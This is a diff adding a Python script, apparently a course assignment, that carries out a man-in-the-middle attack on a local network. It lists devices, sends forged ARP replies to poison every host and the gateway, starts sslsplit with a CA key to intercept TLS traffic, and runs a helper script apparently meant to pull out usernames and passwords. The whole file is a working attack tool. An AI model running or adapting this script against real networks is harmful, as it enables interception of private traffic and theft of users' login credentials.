@@ -1,0 +1,43 @@
+#!/usr/bin/python3
+import subprocess
+import netifaces
+import scapy.all as scapy
+from netfilterqueue import NetfilterQueue
+
+def main():
+
+    # Task I
+    ipmac = subprocess.check_output('./get_ipmac.sh').decode('utf-8').split()
+    ipmac_list = []
+    print('Available devices')
+    print('-------------------------------------')
+    print('IP                  MAC')
+    print('-------------------------------------')
+    gateway_mac = 0
+    for i in range(len(ipmac)//2):
+        if ipmac[i*2].find('gateway') != -1:
+            gateway_mac = ipmac[i*2+1]
+            continue
+        ipmac_list.append((ipmac[i*2],ipmac[i*2+1]))
+        print(f'{ipmac[i*2]:<20}{ipmac[i*2+1]}')
+
+    # Task II
+    gateway_ip = netifaces.gateways()[2][0][0]
+    # print(gateway_ip,gateway_mac)
+    for ip,mac in ipmac_list:
+        # op = 2 -> ARP response
+        victim_spoof = scapy.ARP(op=2,pdst=ip,hwdst=mac,psrc=gateway_ip)
+        router_spoof = scapy.ARP(op=2,pdst=gateway_ip,hwdst=gateway_mac,psrc=ip)
+        scapy.send(victim_spoof,verbose=False)
+        scapy.send(router_spoof,verbose=False)
+
+    # Task III
+    ssl_split = subprocess.Popen('sslsplit -D -S logs -k ca.key -c ca.crt ssl 0.0.0.0 8443 2> /dev/null',shell=True)
+    try:
+        subprocess.run('./get_unpw.sh')
+        print('process over')
+    except KeyboardInterrupt:
+        print('\nInterrupted by keyboard')
+
+if __name__ == '__main__':
+    main()
